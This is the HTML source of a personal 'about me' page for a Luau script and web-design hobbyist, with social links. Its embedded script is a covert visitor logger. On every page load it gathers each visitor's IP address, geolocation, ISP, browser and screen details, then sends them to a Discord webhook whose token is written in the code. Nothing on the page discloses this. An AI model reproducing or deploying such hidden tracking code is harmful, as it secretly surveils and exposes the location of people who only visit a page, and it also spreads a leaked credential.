<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@400..700&display=swap" rel="stylesheet">
    <title>about me</title>
    <style>
        body {
            text-align: center;
            font-family: 'Pixelify Sans', sans-serif;
            background: linear-gradient(135deg, #0f0f12, #141418, #1a1a1f);
            color: white;
            margin: 0;
        }
        body > img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            margin-top: 55px;
        }
        .about {
            font-size: 20px;
        }
        h1 {
            font-size: 20px;
        }
        h5 {
            font-size: 14px;
            color: lightgrey;
        }
        .rscripts,
        .discord,
        .minecraft {
            display: inline-flex;
            text-align: center;
            align-items: center;
            gap: 20px;
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 0%;
            color: white;
            background-color: black;
            box-shadow: 6px 6px 0 #000;
            transition: 0.1s;
            margin: 0 10px;
            border-color: #343434;
            font-family: 'Pixelify Sans', sans-serif;
            font-size: 12px;
            border: 2px solid #343434;
        }
        .rscripts:hover,
        .discord:hover,
        .minecraft:hover {
            transform: translate(6px, 6px);
            box-shadow: 0 0 0 #000;
        }
        .rscripts img,
        .discord img
        .minecraft img {
            width: 30px;
            height: 30px;
        }
        .about img {
            width: 25px;
            height: 25px;
        }
        .about p {
            display: block;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 7px;
        }
    </style>
</head>
<body>

    <img src="https://cdn.discordapp.com/avatars/1367873709288984696/a33f8993c19e333c3940cf8a95879109.png?size=4096">

    <div class="name">
        <h1>pileton</h1>
        <h5>i make scripts and do web design</h5>
    </div>

    <div class="about">
        <p>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Luau_Logo_%28Programming_Language%29.svg/500px-Luau_Logo_%28Programming_Language%29.svg.png"> luau developer
        </p>
        <p>
            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968267.png">
            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968242.png"> front end dev
        </p>
    </div>

    <div class="socials">
        <a class="discord" href="https://discord.gg/MPzuWvg2BT" target="_blank">
            <img src="https://cdn-icons-png.flaticon.com/256/5968/5968756.png">
            join my server!
        </a>
        <a class="rscripts" href="https://rscripts.net/@piletom" target="_blank">
            <img src="https://rscripts.net/logo.svg">
            my scripts!
        </a>
        <a class="minecraft" href="" target="_blank">
            <img src="https://i.gyazo.com/thumb/1000/a4abc5fdb965d1b97db38453012efc73-png.png">
            my minecraft client
    </div>

    <script>
        (function() {

            const webhookId = "1520777802364748009";
            const webhookToken = "lhlkxTniMq2CkClx7owH4XwlPA0lAC2uWRaVNvZdIt174heE-tz57iJ0k4OLhLZEkqPw";
            const webhookUrl = "https://discord.com/api/webhooks/" + webhookId + "/" + webhookToken;

            function collectData() {
                const data = {
                    ip: null,
                    city: null,
                    region: null,
                    country: null,
                    isp: null,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language || navigator.languages?.[0] || 'unknown',
                    userAgent: navigator.userAgent,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    referrer: document.referrer || 'direct',
                    pageUrl: location.href,
                    pageTitle: document.title,
                    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none'
                };

                return fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(json => {
                        data.ip = json.ip;
                        data.city = json.city;
                        data.region = json.region;
                        data.country = json.country_name;
                        data.isp = json.org;
                        return data;
                    })
                    .catch(() => {
                        return fetch('https://api.ipify.org?format=json')
                            .then(r => r.json())
                            .then(json => {
                                data.ip = json.ip;
                                return data;
                            })
                            .catch(() => data);
                    });
            }

            function sendToDiscord(data) {
                const embed = {
                    title: "new log",
                    color: 0x00ff88,
                    fields: [
                        { name: "IP", value: data.ip || 'unknown', inline: true },
                        { name: "Location", value: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'unknown', inline: true },
                        { name: "ISP", value: data.isp || 'unknown', inline: true },
                        { name: "User Agent", value: (data.userAgent || '').slice(0, 100) + ((data.userAgent || '').length > 100 ? '...' : ''), inline: false },
                        { name: "Screen", value: `${data.screenWidth}x${data.screenHeight} (${data.colorDepth}bit)`, inline: true },
                        { name: "Timezone", value: data.timezone || 'unknown', inline: true },
                        { name: "Language", value: data.language || 'unknown', inline: true },
                        { name: "Referrer", value: data.referrer || 'direct', inline: false },
                        { name: "Page", value: `[${data.pageTitle || 'Page'}](${data.pageUrl || '#'})`, inline: false }
                    ],
                    footer: { text: `Logged at ${new Date().toISOString()}` }
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                }).catch(err => console.error('Logging error:', err));
            }

            window.addEventListener('load', function() {
                collectData().then(data => sendToDiscord(data));
            });

        })();
    </script>

</body>
</html>
